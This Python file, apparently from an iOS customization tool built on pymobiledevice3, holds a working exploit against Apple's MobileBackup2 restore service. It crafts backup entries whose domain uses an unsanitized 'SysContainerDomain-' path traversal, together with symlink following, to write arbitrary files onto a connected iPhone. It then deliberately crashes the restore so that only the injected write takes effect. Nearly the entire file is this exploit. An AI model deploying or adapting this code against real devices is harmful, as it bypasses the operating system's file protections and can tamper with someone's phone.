from tempfile import TemporaryDirectory
from pathlib import Path

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
from pymobiledevice3.exceptions import PyMobileDevice3Exception

from . import backup
from .backup import _FileMode as FileMode

def perform_restore(backup: backup.Backup, reboot: bool = False):
    try:
        with TemporaryDirectory() as backup_dir:
            backup.write_to_directory(Path(backup_dir))
            # print(f"Backup dump: {backup}")
            # input("Press Enter to continue, or Ctrl+C to quit...")
                
            lockdown = create_using_usbmux()
            with Mobilebackup2Service(lockdown) as mb:
                mb.restore(backup_dir, system=True, reboot=reboot, copy=False, source=".")
    except PyMobileDevice3Exception as e:
        if "Find My" in str(e):
            print("Find My must be disabled in order to use this tool.")
            print("Disable Find My from Settings (Settings -> [Your Name] -> Find My) and then try again.")
            raise e
        elif "crash_on_purpose" not in str(e):
            raise e

def exploit_write_file(file: backup.BackupFile):
    # Exploits in use:
    # - Path after SysContainerDomain- or SysSharedContainerDomain- is not sanitized
    # - SysContainerDomain will follow symlinks

    # /var/.backup.i/var/mobile/Library/Backup/System Containers/Data/com.container.name
    #   ../       ../ ../    ../     ../    ../               ../  ../
    ROOT = "SysContainerDomain-../../../../../../../.."
    file.domain = ROOT + file.path
    file.path = ""

    back = backup.Backup(files=[
        file,
        # Crash on purpose so that a restore is not actually applied
        backup.ConcreteFile("", ROOT + "/crash_on_purpose", contents=b"")
    ])

    try:
        perform_restore(back)
    except PyMobileDevice3Exception as e:
        if "crash_on_purpose" not in str(e):
            raise e
